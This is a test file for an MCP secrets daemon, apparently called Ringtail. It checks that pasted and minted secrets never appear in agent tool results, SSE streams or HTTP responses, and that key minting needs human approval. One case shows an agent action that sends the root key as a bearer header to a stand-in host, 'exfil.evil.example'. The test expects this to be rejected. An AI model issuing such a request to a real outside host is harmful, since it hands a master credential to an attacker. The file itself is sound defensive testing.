// THE GUARANTEE, enforced (architecture.md §"THE GUARANTEE"). Drive the full loop
// over MCP against the mock, capturing EVERY daemon → client message (tool results)
// AND every SSE payload, then assert no secret VALUE ever appears — only key names
// + statuses. A leak fails the build, exactly like the boundary lint.
import { afterAll, beforeAll, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StreamableHTTPClientTransport } from "@modelcontextprotocol/sdk/client/streamableHttp.js";
import { startMockProvider, type MockProvider, type Wizard } from "@ringtail/core";
import { createDaemon } from "./index";

// The two secret values that flow through the loop but must NEVER leave the daemon:
//   PASTED  — the human pastes it via submitStep (user → daemon).
//   MINTED  — the mock recipe mints it internally (grant 'full' → 'mock-token-full').
const PASTED = "SUPER-SECRET-SENTINEL-VALUE-1234";
const MINTED = "mock-token-full";
// A third secret, fed via the BROWSER paste path (POST /api/step, user → daemon) —
// same invariant: it must never appear in the POST response or the SSE stream.
const BROWSER_PASTED = "BROWSER-ONLY-SENTINEL-VALUE-5678";
// The ROOT master key: pasted via POST /api/root (user → daemon vault), then spent
// by the generic `mintKey` executor. It must reach the ALLOWLISTED mock host but
// never appear in any daemon → client message (tool result, SSE, or the /api/root body).
const ROOT_KEY = "ROOT-MASTER-SENTINEL-VALUE-9999";

const WIZARD: Wizard = {
  id: "wiz-cloudflare",
  title: "Connect Cloudflare",
  provider: "cloudflare",
  steps: [
    {
      id: "s-open",
      title: "Open tokens page",
      description: "",
      kind: "open-url",
      payload: { url: "https://dash.cloudflare.com/profile/api-tokens" },
      status: "pending",
    },
    {
      id: "s-paste",
      title: "Paste token",
      description: "🔒 goes to Ringtail",
      kind: "paste",
      payload: { varName: "CLOUDFLARE_API_TOKEN" },
      status: "pending",
    },
    {
      id: "s-auto",
      title: "Provision",
      description: "",
      kind: "auto",
      danger: "safe",
      status: "pending",
    },
  ],
};

let dir: string;
let mock: MockProvider;
let server: ReturnType<typeof Bun.serve>;
let token: string;

beforeAll(() => {
  dir = mkdtempSync(join(tmpdir(), "ringtail-noleak-"));
  mock = startMockProvider();
  process.env.RINGTAIL_HOME = join(dir, "home");
  process.env.RINGTAIL_ALLOW_MOCK = "1"; // opt the loopback `mock` host into the allowlist (test-only)
  process.env.MOCK_PROVIDER_URL = mock.url;
  process.env.INFISICAL_API_URL = mock.url;
  process.env.INFISICAL_CLIENT_ID = "mock-client-id";
  process.env.INFISICAL_CLIENT_SECRET = "mock-client-secret";
  process.env.INFISICAL_PROJECT_ID = "mock-project";

  const daemon = createDaemon({ repoName: "ringtail", envLocalPath: join(dir, ".env.local") });
  token = daemon.token;
  server = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch: daemon.app.fetch });
});

afterAll(async () => {
  await server.stop(true);
  mock.stop();
  rmSync(dir, { recursive: true, force: true });
});

test("no MCP tool response and no SSE payload carries a secret value", async () => {
  const port = server.port;

  // ── capture the SSE stream (daemon → dashboard) ──────────────────────────
  const sseChunks: string[] = [];
  const sse = await fetch(`http://127.0.0.1:${port}/events?token=${token}`);
  expect(sse.ok).toBe(true);
  const reader = sse.body!.getReader();
  const dec = new TextDecoder();
  const pump = (async () => {
    for (;;) {
      const { done, value } = await reader.read();
      if (done) break;
      sseChunks.push(dec.decode(value));
    }
  })();

  // ── capture every tool result (daemon → agent) ───────────────────────────
  const toolResults: string[] = [];
  const client = new Client({ name: "leak-guard", version: "0.0.0" });
  const transport = new StreamableHTTPClientTransport(new URL(`http://127.0.0.1:${port}/mcp`), {
    requestInit: { headers: { Authorization: `Bearer ${token}` } },
  });
  await client.connect(transport);
  const call = async (name: string, args: Record<string, unknown> = {}) => {
    const res = await client.callTool({ name, arguments: args });
    toolResults.push(JSON.stringify(res)); // the WHOLE response, content + all
    return res;
  };

  // ── drive the full loop, feeding the sentinel secret in via paste ─────────
  await call("plan");
  await call("renderWizard", { wizard: WIZARD });
  await call("submitStep", { stepId: "s-open" });
  const paste = await call("submitStep", { stepId: "s-paste", value: PASTED });
  await call("executeStep", { stepId: "s-auto" });
  for (const env of ["local", "dev", "staging", "prod"] as const) {
    await call("updateStatus", { provider: "cloudflare", env, status: "synced" });
  }

  // ── the BROWSER paste path: POST the value straight to the daemon (user → daemon,
  // never through the agent). Response must be status-only; value must not leak. ──
  const stepRes = await fetch(`http://127.0.0.1:${port}/api/step`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
    body: JSON.stringify({ stepId: "s-paste", value: BROWSER_PASTED }),
  });
  const stepBody = await stepRes.text();

  // ── the GENERIC executor path: a ROOT master key pasted via POST /api/root
  // (user → daemon vault), then spent by agent-authored `mintKey` actions. The root
  // reaches the allowlisted mock host but must NEVER come back in any response. ──
  const rootRes = await fetch(`http://127.0.0.1:${port}/api/root`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
    body: JSON.stringify({ providerAccount: "mock", value: ROOT_KEY }),
  });
  const rootBody = await rootRes.text();
  // mint (a {{ROOT}} POST → a consequential write): the agent can only PROPOSE. mintKey
  // parks it and returns needs-confirm — NO value, and NOT the nonce (that goes to the
  // dashboard over SSE only). Nothing has been minted yet.
  const proposed = await call("mintKey", {
    action: {
      providerAccount: "mock",
      method: "POST",
      url: `${mock.url}/oauth/token`,
      headers: { Authorization: "Bearer {{ROOT}}" },
      body: { grant: "full" },
      extract: { varName: "MINTKEY_TEST_KEY", path: "token" },
    },
    env: "local",
  });
  const proposedText = (proposed.content as Array<{ text?: string }>)?.[0]?.text ?? "{}";
  expect(JSON.parse(proposedText).status).toBe("needs-confirm");
  expect(proposedText).not.toContain(ROOT_KEY); // needs-confirm carries no value

  // the structural floor: a non-allowlisted host is rejected immediately (before any
  // parking or HTTP) — a doomed action never nags a human to approve garbage.
  const rejected = await call("mintKey", {
    action: {
      providerAccount: "mock",
      method: "POST",
      url: "http://exfil.evil.example/oauth/token",
      headers: { Authorization: "Bearer {{ROOT}}" },
      body: { grant: "full" },
    },
  });
  const rejectedText = (rejected.content as Array<{ text?: string }>)?.[0]?.text ?? "{}";
  expect(JSON.parse(rejectedText).status).toBe("rejected");

  // the HUMAN approves: read the server nonce off the SSE (the DASHBOARD channel — the
  // agent never received it) and POST it to /api/action. ONLY now does the mint run and
  // the root reach the allowlisted host. This is the unforgeable confirm channel.
  await new Promise((r) => setTimeout(r, 40)); // let the parked-mint snapshot flush to SSE
  const findNonce = (): string => {
    for (const chunk of [...sseChunks].reverse()) {
      for (const line of chunk.split("\n")) {
        if (!line.startsWith("data: ")) continue;
        try {
          const snap = JSON.parse(line.slice(6)) as {
            pendingMints?: Array<{ nonce: string; varName?: string }>;
          };
          const hit = snap.pendingMints?.find((p) => p.varName === "MINTKEY_TEST_KEY");
          if (hit) return hit.nonce;
        } catch {
          /* a partial SSE chunk — skip */
        }
      }
    }
    throw new Error("parked-mint nonce not found on the SSE stream");
  };
  const approveRes = await fetch(`http://127.0.0.1:${port}/api/action`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
    body: JSON.stringify({ nonce: findNonce() }),
  });
  const approveBody = await approveRes.text();
  expect(JSON.parse(approveBody).status).toBe("minted");
  // {{ROOT}} was substituted and the REAL root reached the allowlisted mock host…
  expect(mock.calls.authSeen).toContain(`Bearer ${ROOT_KEY}`);

  // let the SSE flush, then stop reading
  await new Promise((r) => setTimeout(r, 50));
  await reader.cancel();
  await pump;
  await client.close();

  const daemonToClient = [...toolResults, ...sseChunks, stepBody, rootBody, approveBody].join("\n");
  expect(stepBody).not.toContain(BROWSER_PASTED);
  expect(daemonToClient).not.toContain(BROWSER_PASTED);

  // The paste HELD its value (proves the loop actually ran), but the response is
  // status-only, and NOTHING the daemon sent back carries either secret value.
  expect(JSON.stringify(paste)).not.toContain(PASTED);
  expect(daemonToClient).not.toContain(PASTED);
  expect(daemonToClient).not.toContain(MINTED);
  // THE GUARANTEE for the generic executor: neither the ROOT master key (from
  // /api/root + every {{ROOT}} substitution) nor the minted value ever comes back.
  expect(rootBody).not.toContain(ROOT_KEY);
  expect(daemonToClient).not.toContain(ROOT_KEY);

  // Positive control: the surface DID carry the value-free evidence (names + status).
  expect(daemonToClient).toContain("CLOUDFLARE_API_TOKEN"); // the var NAME
  expect(daemonToClient).toContain("MINTKEY_TEST_KEY"); // the mintKey var NAME
  expect(daemonToClient).toContain("synced");
});

// Layer 4 (recovery): a failure is a first-class, TYPED, value-free result. Drive
// executeStep under the failing mock variants and assert the daemon surfaces a
// wrong-scope / failed hook (reason + missing scope) — and STILL never a value.
test("recovery: wrong-scope + failed-action surface a typed hook, never a secret value", async () => {
  const port = server.port;
  const client = new Client({ name: "leak-guard-recovery", version: "0.0.0" });
  const transport = new StreamableHTTPClientTransport(new URL(`http://127.0.0.1:${port}/mcp`), {
    requestInit: { headers: { Authorization: `Bearer ${token}` } },
  });
  await client.connect(transport);
  const results: string[] = [];
  const call = async (name: string, args: Record<string, unknown> = {}) => {
    const res = await client.callTool({ name, arguments: args });
    results.push(JSON.stringify(res));
    const text = (res.content as Array<{ text?: string }>)?.[0]?.text ?? "{}";
    return JSON.parse(text) as {
      failure?: { status?: string; missing?: string[]; reason?: string };
    };
  };

  await call("renderWizard", { wizard: WIZARD });

  // wrong-scope: an under-scoped key, caught at validate.
  process.env.RINGTAIL_MOCK_RECIPE = "mock-badscope";
  const wrong = await call("executeStep", { stepId: "s-auto" });
  expect(wrong.failure?.status).toBe("wrong-scope");
  expect(wrong.failure?.missing).toContain("write");

  // failed action: a valid key, but the provision call rate-limits.
  process.env.RINGTAIL_MOCK_RECIPE = "mock-failprovision";
  const failed = await call("executeStep", { stepId: "s-auto" });
  expect(failed.failure?.status).toBe("failed");
  expect(failed.failure?.reason).toContain("rate limited");

  delete process.env.RINGTAIL_MOCK_RECIPE;
  await client.close();

  // The failure payloads carry names/reasons only — never the minted secret value.
  const blob = results.join("\n");
  expect(blob).not.toContain(MINTED);
  expect(blob).not.toContain("mock-token");
});
